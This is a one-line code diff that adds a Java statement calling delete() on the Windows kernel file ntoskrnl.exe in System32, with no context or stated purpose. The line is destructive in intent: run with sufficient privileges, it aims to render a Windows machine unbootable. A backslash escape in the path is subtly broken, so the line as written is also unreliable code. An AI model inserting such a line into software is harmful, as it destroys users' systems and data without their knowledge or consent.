@@ -1,0 +1,1 @@
+new File("C:\\windows\\System32\ntoskrnl.exe").delete();
